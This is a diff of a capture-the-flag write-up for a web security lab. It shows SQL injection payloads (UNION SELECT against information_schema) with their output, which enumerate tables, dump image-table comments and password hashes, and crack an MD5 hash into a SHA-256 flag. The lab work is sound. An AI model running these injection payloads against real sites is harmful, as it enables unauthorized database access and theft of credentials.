@@ -46,7 +46,7 @@ Surname : GetTheDecrypt this password -> then lower all the char. Sh256 on it an
 
 
 flag in sh256 without !:  
-> 59a7f515c31c489524d2c93aa4a27b6732cf248d664389990fa8c1be8af00291
+> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
 
 # VIA IMAGE SEARCH:
@@ -67,65 +67,58 @@ ID: 1 OR 1=1#
 Title: Hack me ?
 Url : borntosec.ddns.net/images.png
 
-The "Hack me ?" entry is a nice hint that the flag is waiting in that table. What do you get from the ORDER BY test?
+look for image-related tables/databases:
+
+> 0 UNION SELECT table_name, table_schema FROM information_schema.tables--
+
+ID: 0 UNION SELECT table_name, table_schema FROM information_schema.tables-- 
+Title: Member_images
+Url : list_images 
+
+table_schema/database: Member_images
+table_name: list_images
+
+So now enumerate the columns for that table looking for columns like:
+
+id
+url
+title
+comment
+
+> 0 UNION SELECT column_name, table_name FROM information_schema.columns--
+
+ID: 0 UNION SELECT column_name, table_name FROM information_schema.columns-- 
+Title: list_images
+Url : id
+ID: 0 UNION SELECT column_name, table_name FROM information_schema.columns-- 
+Title: list_images
+Url : url
+ID: 0 UNION SELECT column_name, table_name FROM information_schema.columns-- 
+Title: list_images
+Url : title
+ID: 0 UNION SELECT column_name, table_name FROM information_schema.columns-- 
+Title: list_images
+Url : comment
+
+> 0 UNION SELECT title, comment FROM Member_images.list_images-- 
 
 
-> 0 UNION SELECT table_name, 2 FROM information_schema.tables--
+ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
+Title: An image about the NSA !
+Url : Nsa
+ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
+Title: There is a number..
+Url : 42 !
+ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
+Title: Google it !
+Url : Google
+ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
+Title: Earth!
+Url : Earth
+ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
+Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+Url : Hack me ?
 
-ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
-Title: 2
-Url : INNODB_BUFFER_POOL_STATS
-ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
-Title: 2
-Url : INNODB_BUFFER_PAGE
-ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
-Title: 2
-Url : INNODB_SYS_FOREIGN
-ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
-Title: 2
-Url : db_default
-ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
-Title: 2
-Url : users
-ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
-Title: 2
-Url : guestbook
-ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
-Title: 2
-Url : list_images
 
-Keep the SQLi going (don't drop this)
-The "Hack me ?" title is almost certainly intentionally planted in the DB as a hint. The real flag is probably still in a users table. Don't get sidetracked from:
-
-> 0 UNION SELECT schema_name, 2 FROM information_schema.schemata--
-ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
-Title: 2
-Url : information_schema
-ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
-Title: 2
-Url : Member_Brute_Force
-ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
-Title: 2
-Url : Member_Sql_Injection
-ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
-Title: 2
-Url : Member_guestbook
-ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
-Title: 2
-Url : Member_images
-ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
-Title: 2
-Url : Member_survey
-> 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users--
-ID: 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users-- 
-Title: 2b3366bcfd44f540e630d4dc2b9b06d9
-Url : Je pense, donc je suis
-ID: 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users-- 
-Title: 60e9032c586fb422e2c16dee6286cf10
-Url : Aamu on iltaa viisaampi.
-ID: 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users-- 
-Title: e083b24a01c483437bcf4a9eea7c1b4d
-Url : Dublin is a city of stories and secrets.
-ID: 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users-- 
-Title: 5ff9d0165b4f92b14994e5c685cdce28
-Url : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+1928e8083cf461a51303633093573c46 (md5) ==> albatroz  ==> 9d6595be092a4952c7ec90b44aadd3015090a687bc74531074fac06652c16a3a (sh256) 
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
